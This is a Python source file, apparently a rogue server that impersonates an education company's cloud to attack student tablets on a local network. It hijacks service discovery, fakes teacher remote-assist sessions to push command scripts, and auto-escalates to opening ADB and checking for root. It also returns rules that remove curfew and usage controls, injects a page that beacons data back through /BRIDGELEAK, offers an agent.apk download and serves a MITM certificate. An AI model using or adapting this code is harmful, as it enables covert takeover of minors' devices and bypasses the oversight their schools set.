            _known = ("GetXsList" in _p or "/pub/microServer" in _p or "generate_204" in _p
                      or "wifi.html" in _p or _p.startswith("/probe") or "/forbidden" in _p
                      or _p.startswith("/BRIDGELEAK") or _p.startswith("/TOKENLEAK")
                      or _p.endswith(("ca.crt", "p200-ca.p12", "/note.html")))
            if _p.startswith("/BRIDGELEAK") or _p.startswith("/TOKENLEAK"):
                self._log("BRIDGELEAK", "页面回传: " + self.path[:1500])
                with open(os.path.join(BASE, "bridge_leak.txt"), "a", encoding="utf-8") as _bl:
                    _bl.write("%s %s %s\n" % (ts(), _host, self.path))
                self._send(200, "text/plain", b"ok")
                return
            if (_is_wv or _is_doc) and not _known:
                self._log("MITM-BRIDGE", "投递桥页面 -> Host=%s path=%s UA=%s" % (_host, _p[:80], _ua[:60]))
                _pg = os.path.join(BASE, "mitm_page.html")
                if os.path.exists(_pg):
                    with open(_pg, "rb") as _pf:
                        _pb = _pf.read()
                else:
                    self._log("MITM-BRIDGE-NOFILE", _pg)
                    _pb = ("<html><head><meta charset=\"utf-8\"></head><body>ok"
                           "<script>try{new Image().src=\"https://www.zjxhedu.com/BRIDGELEAK?d=nofile\";}"
                           "catch(e){}</script></body></html>").encode("utf-8")
                self._send(200, "text/html; charset=utf-8", _pb)
                return
        except Exception as _e:
            import traceback as _tb
            self._log("MITM-BRIDGE-ERR", str(_e) + " || " + _tb.format_exc()[-700:])
        # 阿里云 HTTPDNS 解析应答(GET 变体)
        if _httpdns_hit(self.path, self.headers.get("Host", "")):
            self._record()
            hosts = _httpdns_hosts(self.path)
            blob = _httpdns_body(hosts)
            self._log("HTTPDNS", f"type=GET host={hosts} -> {blob.decode()}")
            self._send(200, "application/json; charset=utf-8", blob)
            return
        # 微服务地址下发劫持: 端侧 XHMicroServer 明文拉微服务表, 命中后把各 serverType
        # 指向本机明文面(为 getActualIp 类请求提供 http 入口)
        # CHECKLIST-ENGINE: com.xh.assist 的明文任务引擎(MITM 后走这里)
        if "/pub/tools/checklist" in self.path or "getPbsServer" in self.path:
            import json as _js
            if "getPbsServer" in self.path:
                self._log("PBS-SERVER", "下发 PBS 地址 -> 192.168.137.1:20000")
                self._send(200, "application/json; charset=utf-8",
                           _js.dumps({"retCode": 0, "obj": "192.168.137.1:20000", "msg": "ok"}).encode())
                return
            self._log("CHECKLIST", "任务引擎命中 -> 下发我们的任务 %s" % self.path[:110])
            _tasks = [
                {"class": "PbsCheck", "id": 1, "checkItemId": 1, "level": 0, "name": "pbs",
                 "host": "192.168.137.1", "foreach": []},
                {"class": "PortCheck", "id": 2, "checkItemId": 1, "level": 0, "name": "port",
                 "host": "192.168.137.1", "port": "8000"},
                {"class": "DownloadTest", "id": 3, "checkItemId": 1, "level": 0, "name": "dl",
                 "url": "http://192.168.137.1:8000/agent.apk"},
            ]
            _cl = [{"id": 1, "name": "网络检测", "category": "net", "desc": "auto", "tasks": _tasks}]
            self._send(200, "application/json; charset=utf-8", _js.dumps(_cl).encode())
            return
        if "GetXsList" in self.path or "/pub/microServer" in self.path:
            body = self._record()
            self._log("MICRO_DISPATCH", f"微服务下发 {self.path} BODY={body[:300]}")
            self._send(200, "application/json; charset=utf-8",
                       _micro_body(self.path))
            return
        # ❿ CONTROL 微服务(SB103015) 业务端点: ControlService.reqControlData() 调
        #    getMicroUrl("/api/v1/forbidden/detail") -> 响应 JSON 解析为 ForbidTime
        #    (curfew 夜间禁用 + periods 长期禁用时段)。返回"永不触发管控"的合法结构,
        #    使端侧解除时间限制；同时捕获请求以确认 CONTROL 通道是否真的落到本机。
        if "/forbidden/detail" in self.path or "/forbidden" in self.path:
            self._log("CONTROL_REQ", f"CONTROL命中! {self.headers.get('Host','-')} {self.path} UA={self.headers.get('User-Agent','-')}")
            try:
                with open(os.path.join(BASE, "control_hits.log"), "a", encoding="utf-8") as _cf:
                    _cf.write(f"{ts()} HOST={self.headers.get('Host','-')} PATH={self.path} UA={self.headers.get('User-Agent','-')}\n")
            except OSError:
                pass
            # ForbidTime: curfew/periods 留空 = 不施加任何时段管控
            self._send(200, "application/json; charset=utf-8",
                       json.dumps({"periods": [], "curfew": None},
                                  ensure_ascii=False).encode("utf-8"))
            return
        if self.path.startswith("/probe"):
            self._log("PROBE", self.path)
            self._send(200, "text/plain", b"probe-ok:1")
            return
        if self._serve_cert():
            return
        # 端侧联网自检页: 平板(okhttp)反复请求 www.zjxhedu.com/data/wifi.html
        # 原实现落到 404 -> 端侧判"网络不可用"并循环重试, 不进入正常业务(assist 轮询)。
        # 改为回 200 正常页, 促使端侧判定网络可用并放行后续 API 请求。
        # Android 连通性探测: 必须回"精确 204(空 body)"系统才判网络 VALIDATED;
        # 早期统一回 200 "Success" 会被判为"captive portal 拦截", 网络停在未认证态,
        # 端侧 App 因此反复自检不进入业务。此处拆出标准 204 以触发网络状态翻转 -> App 重走服务发现。
        if "/generate_204" in self.path or "/gen_204" in self.path:
            self._log("NETCHECK-204", f"port={self._lp()} {self.headers.get('Host', '-')} {self.path} UA={self.headers.get('User-Agent', '-')}")
            try:
                self.send_response(204)
                self.send_header("Content-Length", "0")
                self.end_headers()
            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError, OSError):
                pass
            return
        if "/data/wifi.html" in self.path \
                or "/hotspot-detect.html" in self.path or "/library/test/success.html" in self.path:
            self._log("NETCHECK", f"port={self._lp()} {self.headers.get('Host', '-')} {self.path} UA={self.headers.get('User-Agent', '-')}")
            # 回真实自检页(正文含"连接成功！"+"浙江学海教育科技有限公司"两标记),
            # 端侧 wifimanager 才判 isConnect=true 并 finish(), 放行后续 /api 业务轮询。
            try:
                with open(WIFI_OK_PAGE, "rb") as _wf:
                    _wbody = _wf.read()
            except OSError:
                _wbody = ('<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />'
                          '<title>公司简介-浙江学海教育科技有限公司</title></head>'
                          '<body>连接成功！ 浙江学海教育科技有限公司</body></html>').encode("utf-8")
            self._send(200, "text/html; charset=UTF-8", _wbody)
            return
        # 根路径/服务端自述: 让平板把本机识别为智通云服务端, 引导后续 /api/v1/... 请求
        if self.path in ("/", "/ztp_server", "/index.html", "/favicon.ico", "/server"):
            self._log("SERVER_ROOT", f"root hit: {self.path}")
            body = {
                "serverIp": MICRO_HOST, "serverPort": 443, "serverName": "yunzuoye",
                "gateway": MICRO_BASE, "compat": "1.0", "version": 1,
                "apiBase": "/api/v1/users/10001/devices/SM-P200"
            }
            self._send(200, "application/json; charset=utf-8", json.dumps(body, ensure_ascii=False).encode("utf-8"))
            return
        body = self._record()
        # ➓ PBS 引导: 平板 PushCore 走明文 HTTP 拉 clientId 与 PBS 地址
        #    (PushHttpReq 要求响应 JSON {retCode:0, obj:"..."} 才继续连接 PBS)
        if "/as/login" in self.path:
            q = self._query()
            client_id = (q.get("clientId") or q.get("deviceId")
                         or self.headers.get("X-Client-Id") or "SM-P200-MARVIS")
            if q.get("userId"):
                try:
                    with open(USERID_FILE, "w", encoding="utf-8") as _uf:
                        _uf.write(q["userId"])
                except OSError:
                    pass
            self._log("AS_LOGIN", f"clientId={client_id} uid={q.get('userId')} -> retCode=0 obj={client_id}")
            self._send(200, "application/json; charset=utf-8",
                       json.dumps({"retCode": 0, "obj": client_id, "msg": "ok"},
                                  ensure_ascii=False).encode("utf-8"))
            return
        if "/as/getpbs" in self.path.lower():
            q = self._query()
            self._log("AS_PBS", f"clientId={q.get('clientId')} uid={q.get('userId')} -> PBS={PBS_ADDR}")
            self._send(200, "application/json; charset=utf-8",
                       json.dumps({"retCode": 0, "obj": PBS_ADDR, "msg": "ok"},
                                  ensure_ascii=False).encode("utf-8"))
            return
        # ③ 资源版本轮询(端侧 ResourceUpdateManager 周期 GET, 全程无用户交互)
        #    GET /api/v1/pub/versionChange/{userId}/{schoolId}/{version}
        #    响应 dataCodes 命中 ApiDataCode.REMOTE_ASSIST -> 端侧发广播 -> CpvdReceiverCallback
        #    -> AssistManager.requestAssist(null) -> 自动拉 /assists -> 进入协助态
        # RELEASENOTE-INJECT: 版本更新检查 -> 弹窗加载我们的页面
        #   依据: ServerConfig:41 platformServiceConfig()="SA106003"; 我们把 SA106003 -> 本机:8000
        #        ReleaseNoteService:55 /api/v1/pub/distribution/apps/<pkg>/versions/<ver>/check
        #        ReminderDialog:128 loadUrl(url) + :187 JS桥 "js"
        if "/distribution/apps/" in self.path and self.path.rstrip("/").endswith("/check"):
            self._record()
            _state_add("release_note")
            self._log("RELEASENOTE",
                      f"更新检查命中 -> 下发我们的页面 ({self.path})")
            _rn = json.dumps({"versionCode": 999999, "reminded": 0,
                              "url": "http://192.168.137.1:8099/note.html"}).encode("utf-8")
            self._send(200, "application/json; charset=utf-8", _rn)
            return
        if "/versionChange/" in self.path:
            try:
                vm = re.search(r"/versionChange/(\d+)/(\d+)/(-?\d+)", self.path)
                uid = vm.group(1) if vm else "-"
                resp = {"dataCodes": REMOTE_ASSIST_CODE,
                        "intervalTime": 60000,
                        "version": 2147483000}
                _state_add("versionchange_inject")
                self._log("VERSIONCHANGE",
                          f"下发资源码 uid={uid} code={REMOTE_ASSIST_CODE} -> 触发端侧自动 assist")
                self._send(200, "application/json; charset=utf-8",
                           json.dumps(resp, ensure_ascii=False).encode("utf-8"))
            except Exception as e:
                self._log("VERSIONCHANGE_ERR", repr(e))
                self._send(200)
            return
        # ④ 平台 check(端侧 Home 加载/心跳 GET, 响应含 assist.id 即自动构造 AssistNotify(ENTRY))
        #    GET /api/v1/platform/users/{userId}/check
        #    端侧 CheckDataEntity.parser: optJSONObject("assist").optString("id") + setOperate(ENTRY)
        #    -> HomeViewModel.doLast -> AssistManager.sendAssistMessage -> AssistService.startAssist
        if "/platform/users/" in self.path and self.path.rstrip("/").endswith("/check"):
            resp = {"assist": {"id": "assist_marvis_0001"},
                    "config": {}, "apps": {}, "eyeShield": {}}
            _state_add("check_inject")
            self._log("CHECK_INJECT", f"check 注入 assist.id -> 触发端侧自动 assist ({self.path})")
            self._send(200, "application/json; charset=utf-8",
                       json.dumps(resp, ensure_ascii=False).encode("utf-8"))
            return
        # ① 学生端 requestAssist: GET /api/v1/users/{u}/devices/{d}/assists (无 /tasks)
        #    返回伪造的"教师端已开启"会话, 学生端取其 JSON "id" 作为 assistId 进入协助态
        if "/assists" in self.path and "/tasks" not in self.path and "/able" not in self.path:
            m = mode()
            if m == "off":
                self._send(204)
                return
            _state_add("assist_open")
            self._log("ASSIST_OPEN", f"发伪造协助会话 mode={m} -> {json.dumps(FAKE_ASSIST, ensure_ascii=False)}")
            self._send(200, "application/json; charset=utf-8", json.dumps(FAKE_ASSIST, ensure_ascii=False).encode("utf-8"))
            return
        # ② 学生端 requestAssistTask: GET /api/v1/users/{u}/devices/{d}/assists/{aid}/tasks
        #    返回顶层 JSONArray (元素: id/instruction/step), instruction 为 ZAZE 脚本
        if "/assists/" in self.path and ("/tasks" in self.path or "task" in self.path.lower()):
            m = mode()
            if m == "off":
                # 对齐真云语义: 无任务档返回空 JSONArray 而非 204, 学生端循环继续轮询
                self._log("ASSIST", "mode=off -> 空任务数组 []")
                self._send(200, "application/json; charset=utf-8", b"[]")
                return
            tasks = build_tasks(m)
            _state_add("tasks_served", len(tasks))
            self._log("ASSIST", f"mode={m} 下发 {len(tasks)} 个任务")
            self._send(200, "application/json; charset=utf-8", json.dumps(tasks, ensure_ascii=False).encode("utf-8"))
            return
        # 其它 API：记录并回 200
        if "/api/" in self.path:
            self._log("API", f"unhandled api: {self.path}")
            self._send(200)
            return
        # 兜底: 未知 GET 也回 200, 避免端侧因 4xx 判定"服务异常"而退避重试
        self._log("UNKNOWN_GET", f"{self.headers.get('Host', '-')} {self.path} UA={self.headers.get('User-Agent', '-')}")
        self._send(200)

    def do_POST(self):
        body = self._record()
        # 阿里云 HTTPDNS 解析应答(POST 变体): 使端侧零操作下的 5 分钟轮询重连伪云
        if _httpdns_hit(self.path, self.headers.get("Host", "")):
            hosts = _httpdns_hosts(self.path)
            q = self._query()
            blob = _httpdns_body(hosts)
            self._log("HTTPDNS", f"type=POST host={hosts} aes={'aes' in q} sign={'sign' in q} cid={'103172' in self.path} -> {blob.decode()}")
            self._send(200, "application/json; charset=utf-8", blob)
            return
        # 微服务地址下发劫持(POST 变体: RESTFul /api/v1/pub/microServer/)
        if "GetXsList" in self.path or "/pub/microServer" in self.path:
            self._log("MICRO_DISPATCH", f"微服务下发(POST) {self.path} BODY={body[:300]}")
            self._send(200, "application/json; charset=utf-8",
                       _micro_body(self.path))
            return
        # 平板上报通道: POST /up (8089, body=base64(gzip))。真云应答样本未采到,
        # 统一回 200+空 JSON 保活, 并把 body 长度与原文落盘供离线解码。
        # ★★★ CA-DOWNLOAD (2026-10-10 22:2x): 平板直接访问 http://192.168.137.1:8000/ca.cer
        #   下载 MITM 根证书, 在 设置->安全->从存储设备安装->应用/VPN 证书 里装上,
        #   之后 443 中间人即可解密/改写 App 的全部 HTTPS。
        if self.path.split("?")[0].lower() in ("/ca.cer", "/ca.crt", "/ca.pem", "/cert", "/ca"):
            try:
                _pem = self.path.split("?")[0].lower().endswith(".pem")
                _f = "ca.pem" if _pem else "ca.cer"
                _blob = open(os.path.join(BASE, "mitm_ca", _f), "rb").read()
                self._log("CA_DOWNLOAD", "path=%s file=%s %dB" % (self.path[:40], _f, len(_blob)))
                self.send_response(200)
                self.send_header("Content-Type", "application/x-x509-ca-cert" if not _pem
                                 else "application/x-pem-file")
                self.send_header("Content-Length", str(len(_blob)))
                self.send_header("Content-Disposition", "attachment; filename=%s" % _f)
                self.end_headers()
                self.wfile.write(_blob)
            except Exception as _e:
                self._log("CA_DOWNLOAD_ERR", repr(_e))
            return
        if self.path == "/up" or self.path.rstrip("/").endswith("/up"):
            self._log("UP_REPORT", f"len={len(body)} body={body}")
            try:
                with open(os.path.join(BASE, "up_raw.log"), "a", encoding="utf-8") as f:
                    f.write(f"{ts()} len={len(body)} body={body}\n")
            except OSError:
                pass
            self._send(200, "application/json; charset=utf-8", b"{}")
            return
        # 学生端执行指令后的结果上报: POST /api/v1/users/{u}/devices/{d}/assist/result
        # body 含 taskId / result / content(指令输出) —— 日志落盘用于回读平板端执行结果
        if "/assist/result" in self.path:
            _state_add("results", last_result=body)
            self._log("ASSIST_RESULT", f"执行结果上报: {body}")
            # 中间段关键闭环节点: 检测 root-adb 通道已打通(uid=0 / tcp 5555 回读)
            if _detect_5555(body):
                ok = _write_5555_signal(body)
                _state_add("signal_written", 1 if ok else 0)
                self._log("SIGNAL5555", f"检测到 root 通道就绪(uid=0/tcp5555) -> 写信号文件 {'OK' if ok else 'FAIL'}")
            # probe 档: 一旦收到执行结果(说明 ZAZE/assist 通道真实打通), 自动升级 open-adb
            if AUTO_ESCALATE and mode() == "probe":
                ok = ("MARVIS_PROBE_OK" in body) or ("uid=" in body) or ("result:1" in body) or (body.strip().startswith("{"))
                if ok:
                    with open(MODE_FILE, "w") as f:
                        f.write("open-adb")
                    self._log("ESCALATE", "probe 成功 -> 自动升级 open-adb 档, 下次任务下发将开启 adb")
            self._send(200)
            return
        # 学生端协助结束/状态变体兜底: 不同实现可能用 /assist/finish /assist/status /assist/complete
        if "/assist" in self.path and ("finish" in self.path.lower() or "status" in self.path.lower() or "complete" in self.path.lower() or "/close" in self.path.lower()):
            _state_add("finish_events")
            self._log("ASSIST_FINISH", f"协助结束/状态变体 -> {self.path} BODY={body}")
            self._send(200)
            return
        if "/license/activate" in self.path or "activate" in self.path:
            self._log("ACTIVATE", f"activation request captured: {body}")
            self._send(200)
            return
        if "/api/" in self.path:
            self._send(200)
            return
        # 兜底: 未知 POST(含平板 8089 /up 上报)一律回 200, 绝不回 404
        # 历史坑: 404 被端侧判"云端异常" -> 平板停掉状态机并转入 wifi.html 自检死循环
        self._send(200)

    def do_PUT(self):
        body = self._record()
        # 学生端协助心跳: PUT /api/v1/assists/{id}/active (body: deviceId)
        if "/active" in self.path:
            _state_add("assist_heart")
            self._log("HEART", f"协助心跳 -> {self.path} BODY={body}")
            self._send(200)
            return
        if "/assist" in self.path and ("finish" in self.path.lower() or "status" in self.path.lower() or "complete" in self.path.lower()):
            _state_add("finish_events")
            self._log("ASSIST_FINISH", f"协助结束/状态变体 -> {self.path} BODY={body}")
            self._send(200)
            return
        if "/api/" in self.path:
            self._send(200)
            return
        self._send(200)

    def do_PATCH(self):
        self.do_POST()

    def log_message(self, fmt, *args):
        pass  # 抑制默认 stderr，全部走 _log


class _TLSMixHTTPServer(ThreadingHTTPServer):
    """TLS 端口专用: accept 明文 socket(主循环不阻塞), TLS 握手放到独立线程完成后再分发请求。

    历史坑(2026-09-19 定位): 旧写法 `srv.socket = ctx.wrap_socket(listening_sock)` 让
    accept() 在主 accept 循环里同步做 TLS 握手 —— 任一"TCP 连上但不发/慢发 ClientHello"
    的客户端(平板切后台、网络抖动、握手被 abort)会把 443 的 accept 循环挂死, backlog 打满后
    新连接直接被 RST(表现为 connection refused), HTTPS API 全部进不来。
    改为: 主循环只 accept, 每条连接单独起线程做握手+处理。"""
    daemon_threads = True
    allow_reuse_address = True
    tls_ctx = None

    def get_request(self):
        sock, addr = self.socket.accept()
        try:
            sock.settimeout(15)  # 半握手连接最多占用 15s, 到期释放
        except Exception:
            pass
        return sock, addr

    def process_request(self, request, client_address):
        threading.Thread(target=self._tls_wrap_and_serve,
                         args=(request, client_address), daemon=True).start()

    def _tls_wrap_and_serve(self, sock, addr):
        try:
            ssock = self.tls_ctx.wrap_socket(sock, server_side=True)
        except Exception as e:
            # 诊断: 端侧在握手中途 abort(如 fatal alert certificate_unknown / 降级哨兵告警) 时,
            # 这里能拿到 OpenSSL 的原始报错, 是判断"证书不被信任"还是"协议版本不匹配"的关键证据。
            try:
                with open(DIAG, "a", encoding="utf-8") as f:
                    f.write(f"{ts()} [TLS-FAIL] {addr[0]}:{addr[1]} {type(e).__name__}: {e}\n")
            except Exception:
                pass
            try:
                sock.close()
            except Exception:
                pass
            return
        try:
            self.finish_request(ssock, addr)
        except Exception:
            pass
        finally:
            try:
                self.shutdown_request(ssock)
            except Exception:
                pass


def build_server(host="127.0.0.1", port=8000, tls=False):
    """构造(不启动)HTTPServer; 用于 __main__ / 无平板自测。
    host 默认为 127.0.0.1 便于自测; __main__ 用 0.0.0.0。"""
    # 必须用 ThreadingHTTPServer: 原 HTTPServer 单线程串行, 任一慢连接(平板 TLS 握手
    # 未完成/长轮询)会阻塞该端口后续全部请求, 是 assist 面"看起来没反应"的隐患点。
    srv = _TLSMixHTTPServer((host, port), H) if tls else ThreadingHTTPServer((host, port), H)
    # backlog: 默认只有 5, 平板(尤其重启/切前后台)会瞬时并发重连打满队列, 溢出 SYN 直接被
    # RST(抓包/自测里表现为 connection refused, 极易误判成"端口没监听")。抬到 128。
    srv.request_queue_size = 128
    if tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        # 关键修复(2026-09-19): 端侧(智通云学生端)是纯 TLS1.2 客户端(ClientHello 只带
        # TLS1.2 cipher, 无 supported_versions)。若服务端启用 TLS1.3, OpenSSL 在协商
        # 到 TLS1.2 时会在 ServerHello.random 末尾填 "DOWNGRD\x01" 降级哨兵; 端侧收到后
        # 立即回 fatal alert(protocol_version=0x2e, 报文 1503030002022e) 中止握手 ——
        # 表现为平板反复重连 443 且 cloud_api.log 无任何请求落盘(HTTPS API 永远进不来)。
        # 修正: 服务端最高版本压到 TLS1.2, 与端侧能力对齐, 不再发送哨兵。
        # 如需恢复 TLS1.3, 设环境变量 CLOUD_API_ALLOW_TLS13=1。
        if os.environ.get("CLOUD_API_ALLOW_TLS13", "0") not in ("1", "true", "yes"):
            ctx.maximum_version = ssl.TLSVersion.TLSv1_2
        ctx.load_cert_chain(CERT, KEY)
        # 诊断: 记录端侧 ClientHello 携带的 SNI, 用于判断端侧实际想访问的主机名。
        try:
            def _sni_cb(sslsock, server_name, sslctx):
                try:
                    with open(DIAG, "a", encoding="utf-8") as f:
                        f.write(f"{ts()} [SNI] peer={sslsock.getpeername()[0]} name={server_name!r}\n")
                except Exception:
                    pass
            ctx.sni_callback = _sni_cb
        except Exception:
            pass
        # 修复(2026-09-19 定位): 原残留行 `srv.socket = ctx.wrap_socket(srv.socket, server_side=True)`
        # 把【监听 socket】替换成了 SSLSocket —— 于是 accept() 内部先替每条连接做一次 TLS 握手,
        # 之后 _tls_wrap_and_serve() 又 wrap 一次 -> 同一连接被握手两次, 第二次读到的是加密后的
        # 应用数据, 必然失败并关闭连接。表现为: 443 上任何 HTTPS 请求都进不到 HTTP 层、端侧反复重连。
        # 正确做法: 监听 socket 保持明文, 由 _tls_wrap_and_serve 对每条连接只做一次握手。
        srv.tls_ctx = ctx
    return srv


def serve(host, port, tls):
    try:
        srv = build_server(host, port, tls)
    except OSError as e:
        try:
            with open(LOG, "a", encoding="utf-8") as f:
                f.write(f"{ts()} [SERVE-ERR] {host}:{port} 绑定失败: {e}\n")
        except OSError:
            pass
        print(f"[SERVE-ERR] {host}:{port} 绑定失败: {e} (已跳过, 端口可能被占用)", flush=True)
        return
    print(f"cloud_api serving {host}:{port} tls={tls}", flush=True)
    try:
        srv.serve_forever()
    finally:
        srv.server_close()


if __name__ == "__main__":
    # 2026-10-02 修复(攻击链唯一必经节点): 端侧服务发现
    #   V1 -> GET  http://ms.yunzuoye.net/XhServerMg/GetXsList            (端口 80)
    #   V2 -> POST http://43.227.195.99/ms/api/v2/pub/microServer/list/   (端口 80)
    #   V3 -> POST http://43.227.195.99/ms/api/v3/pub/microServer/list/   (端口 80)
    # 全部走 80。此前 __main__ 只起 8000/8089, 80 无人应答 -> 端侧永远拿不到
    # 伪造微服务表 -> 全业务基址无法切到本机明文面 -> assist 只在偶发窗口被
    # 接住随即回退(死结根因)。此处补齐 80 监听。
    # 2026-10-04 修正: 端口 80 交给 npcap_http80.py(L2 冒充器)独占。
    # 原因: cloud_api 绑 0.0.0.0:80 时, 凡是真正发往本机 192.168.137.1:80 的请求会被
    # 【两个应答器同时回包】(L2 伪造帧 + 真实 socket), 端侧收到两份 HTTP 响应 -> 解析错乱。
    # npcap_http80 用伪造源 IP 的帧应答, 既不占用真实 socket, 又能接管发往任意
    # 上游 IP 的 80 流量(服务发现正是发往 ms.yunzuoye.net 解析出的云 IP), 覆盖面严格更大。
    for p in (8000, 8089):
        threading.Thread(target=serve, args=("0.0.0.0", p, False), daemon=True).start()
    # 2026-09-19 策略切换(证书绕不过 -> 改透传):
    #   端侧 App 全程走 *.yunzuoye.net 的 HTTPS, 且客户端不信任本地自签证书链
    #   (tls_diag.log: 147 次 SSLError + 146 次 ConnectionReset, 全部 certificate_unknown),
    #   本地 TLS 终止这条路已被证伪。443/8443 改由 tls_relay.py 把端侧连接
    #   【透明转发到真云入口】, 端侧与真云端到端握手成功 -> 端侧业务解冻 ->
    #   端侧随后拉取的明文微服务地址表仍由本机 80 接住并改指本机业务面。
    print("cloud API servers up: http :8000/8089  (443/8443 handed to tls_relay)", flush=True)
    while True:
        time.sleep(3600)
